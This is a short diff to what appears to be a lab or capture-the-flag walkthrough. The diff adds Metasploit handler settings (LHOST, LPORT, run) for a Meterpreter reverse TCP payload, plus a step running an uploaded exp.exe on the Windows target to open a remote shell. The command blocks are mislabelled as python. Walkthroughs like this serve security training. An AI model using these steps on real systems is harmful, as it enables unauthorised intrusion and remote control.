@@ -418,6 +418,21 @@ We uploaded the EXE using the upload command in Evil-WinRM and configured msfcon
 set PAYLOAD windows/x64/meterpreter/reverse_tcp
 ```
 
+```python
+set LHOST 172.16.250.11
+```
+
+```python
+set LPORT 9005
+```
+
+```python
+run
+```
+
+```python
+.\exp.exe
+```
 ![[Pasted image 20250512201912.png]]
 
 ![[Pasted image 20250512201519.png]]
